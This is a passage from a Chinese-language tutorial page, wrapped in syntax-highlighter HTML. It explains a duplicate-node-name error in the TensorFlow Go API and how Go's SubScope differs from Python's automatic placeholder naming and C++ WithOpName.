crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngo run attempt1.go</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4765320713097-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a4765320713097-1\"><span class=\"crayon-e\">go </span><span class=\"crayon-e\">run </span><span class=\"crayon-v\">attempt1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">go</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这是他看到的结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a476c067314358\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npanic: failed to add operation \"Placeholder\": Duplicate node name in graph: 'Placeholder'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a476c067314358-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a476c067314358-1\"><span class=\"crayon-v\">panic</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">failed </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">add </span><span class=\"crayon-i\">operation</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Placeholder\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Duplicate </span><span class=\"crayon-e\">node </span><span class=\"crayon-e\">name </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">graph</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'Placeholder'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>等等，这里发生了什么？ 显然，存在两个名称都为“Placeholder”的操作。</p>\n<p><strong>第一节课： 节点ID</strong></p>\n<p>每当我们调用一个方法来定义一个操作时，Python API都会生成不同的节点，无论是否已经被调用过。下面的代码返回3。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a4770759851541\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport tensorflow as tf  \r\na = tf.placeholder(tf.int32, shape=())  \r\nb = tf.placeholder(tf.int32, shape=())  \r\nadd = tf.add(a,b)  \r\nsess = tf.InteractiveSession()  \r\nprint(sess.run(add, feed_dict={a: 1,b: 2}))</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4770759851541-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4770759851541-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4770759851541-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4770759851541-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4770759851541-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4770759851541-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a4770759851541-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">tensorflow </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">tf</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4770759851541-2\"><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">placeholder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">int32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shape</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4770759851541-3\"><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">placeholder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">int32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shape</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4770759851541-4\"><span class=\"crayon-v\">add</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4770759851541-5\"><span class=\"crayon-v\">sess</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">InteractiveSession</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4770759851541-6\"><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sess</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">add</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">feed_dict</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">b</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>我们可以通过打印占位符的名称来验证此程序是否创建了两个不同的节点：print(a.name，b.name)生成Placeholder:0 Placeholder_1:0，因此，b占位符是Placeholder_1:0，而a占位符是Placeholder:0。</p>\n<p>在Go中，相反，之前的程序会执行失败，因为A和x都命名为Placeholder。我们可以得出这样的结论：</p>\n<p><strong>Go API不会在每次调用函数来定义操作的时候自动生成新的名字：操作的名字是固定的，我们无法修改。</strong></p>\n<p><strong>提问时间：</strong></p>\n<ul>\n<li>关于Tensorflow架构，我们学到了哪些东西？图中的每个节点都必须具有唯一的名称。每个节点都用名称来标识。</li>\n<li>节点的名称与用名字来定义的操作相同吗？是的，但还有更好的答案，不完全是，节点的名称只是操作的一部分。</li>\n</ul>\n<p>为了详细说明第二个答案，我们来解决节点名重复的问题。</p>\n<p><strong>第二节课： 作用域</strong></p>\n<p>正如我们刚刚看到的那样，每定义一个操作时，Python API都会自动创建一个新的名称。在底层，Python API调用类Scope的C++方法WithOpName。以下是方法的文档及其签名，保存在<a href=\"https://github.com/tensorflow/tensorflow/blob/a5b1fb8e56ceda0ee2794ee05f5a7642157875c5/tensorflow/cc/framework/scope.h\" target=\"_blank\">scope.h</a>中：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a4774084713451\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/// Return a new scope. All ops created within the returned scope will have\r\n/// names of the form &amp;lt;name&amp;gt;/&amp;lt;op_name&amp;gt;[_&amp;lt;suffix].\r\nScope WithOpName(const string&amp;amp; op_name) const;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4774084713451-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4774084713451-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4774084713451-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a4774084713451-1\"><span class=\"crayon-c\">/// Return a new scope. All ops created within the returned scope will have</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4774084713451-2\"><span class=\"crayon-c\">/// names of the form &amp;lt;name&amp;gt;/&amp;lt;op_name&amp;gt;[_&amp;lt;suffix].</span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4774084713451-3\"><span class=\"crayon-e\">Scope </span><span class=\"crayon-e\">WithOpName</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">string</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">amp</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op_name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">const</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>我们注意到，这个用于命名节点的方法返回了一个Scope，因此，节点名实际上是一个Scope。Scope是从根 /（空的图）到op_name的<strong>完整路径</strong>。</p>\n<p>当我们尝试添加一个具有与/到op_name相同路径的节点时，WithOpName方法会添加一个后缀_&lt;suffix&gt;（其中&lt;suffix&gt;是一个计数器），因此它将成为同一范围内的重复的节点。</p>\n<p>知道了这一点之后，为了解决重复节点名的问题，我们期望在Scope类型中找到WithOpName方法。可悲的是，这种方法并不存在。</p>\n<p>相反，查看<a href=\"https://godoc.org/github.com/tensorflow/tensorflow/tensorflow/go/op#Scope\" target=\"_blank\">Scope类型的文档</a>，我们可以看到唯一的一个方法：SubScope，它返回一个新的Scope。</p>\n<p>文档里是这么说的：</p>\n<blockquote><p>SubScope返回一个新的Scope，这将导致添加到图中的所有操作都将以“namespace”为命名空间。如果命名空间与作用域内现有的命名空间冲突，则会添加一个后缀。</p></blockquote>\n<p>使用后缀的冲突管理与C++的WithOpName不同：WithOpName是在操作名之后添加后缀，但还是在同一作用域内（因此占位符变为了Placeholder_1），而Go的SubScope是在作用域名称后添加后缀。</p>\n<p>这种差异会产生完全不同的图，但它们在计算上是等效的。</p>\n<p>我们来改变占位符的定义，以此来定义两个不同的节点，此外，我们来打印一下作用域的名称。</p>\n<p>让我们创建文件attempt2.go，把这几行从：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a4778941238707\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nA := op.Placeholder(root, tf.Int64, op.PlaceholderShape(tf.MakeShape(2, 2)))  \r\nx := op.Placeholder(root, tf.Int64, op.PlaceholderShape(tf.MakeShape(2, 1)))</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4778941238707-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4778941238707-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a4778941238707-1\"><span class=\"crayon-v\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Placeholder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Int64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">PlaceholderShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">MakeShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4778941238707-2\"><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Placeholder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Int64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">PlaceholderShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">MakeShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>改成：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a477d085711762\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// define 2 subscopes of the root subscopes, called \"input\". In this  \r\n// way we expect to have a input/ and a input_1/ scope under the root scope  \r\nA := op.Placeholder(root.SubScope(\"input\"), tf.Int64, op.PlaceholderShape(tf.MakeShape(2, 2)))  \r\nx := op.Placeholder(root.SubScope(\"input\"), tf.Int64, op.PlaceholderShape(tf.MakeShape(2, 1)))  \r\nfmt.Println(A.Op.Name(), x.Op.Name())</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a477d085711762-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a477d085711762-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a477d085711762-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a477d085711762-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a477d085711762-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a477d085711762-1\"><span class=\"crayon-c\">// define 2 subscopes of the root subscopes, called \"input\". In this  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a477d085711762-2\"><span class=\"crayon-c\">// way we expect to have a input/ and a input_1/ scope under the root scope  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a477d085711762-3\"><span class=\"crayon-v\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Placeholder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">SubScope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"input\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Int64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">PlaceholderShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">MakeShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span 